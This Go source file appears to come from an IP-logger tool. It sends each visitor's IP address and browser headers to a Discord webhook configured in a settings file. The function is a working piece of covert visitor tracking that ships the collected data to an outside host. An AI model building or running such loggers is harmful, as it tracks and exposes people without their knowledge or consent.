package method

import (
	"dangerous_user/config"
	"log"
	"net/http"

	"github.com/gtuk/discordwebhook"
)

// Fonction pour envoyer un message à une Webhook Discord avec un embed
func SendEmbedToWebhook(title *http.Header, ip string) error {
	desc := ""
	var full_config = config.Get_config()

	var thumbnail_url = full_config["webhook_picture"].(string)
	var content = full_config["webhook_msg_content"].(string)
	var footer_text = full_config["webhook_credit"].(string)
	var username = full_config["webhook_name"].(string)
	var url = full_config["webhook_url"].(string)

	embed := discordwebhook.Embed{
		Title:       &ip,
		Description: &desc,
		Thumbnail: &discordwebhook.Thumbnail{
			Url: &thumbnail_url,
		},
		Author: &discordwebhook.Author{
			Name:    &footer_text,
			IconUrl: &thumbnail_url,
		},
		Image: &discordwebhook.Image{
			Url: &thumbnail_url,
		},
		Footer: &discordwebhook.Footer{
			Text:    &footer_text,
			IconUrl: &thumbnail_url,
		},
	}

	message := discordwebhook.Message{
		Username: &username,
		Content:  &content,
		Embeds:   &[]discordwebhook.Embed{embed}, // Assign the pointer to the slice
	}

	desc += "`User-Agent` **" + title.Get("User-Agent") + "** \n"
	desc += "`Accept-Language` **" + title.Get("Accept-Language") + "** \n"
	desc += "`Accept` **" + title.Get("Accept") + "** \n"
	desc += "\n\n" + content
	err := discordwebhook.SendMessage(url, message)
	if err != nil {
		log.Fatal(err)
	}

	return nil
}
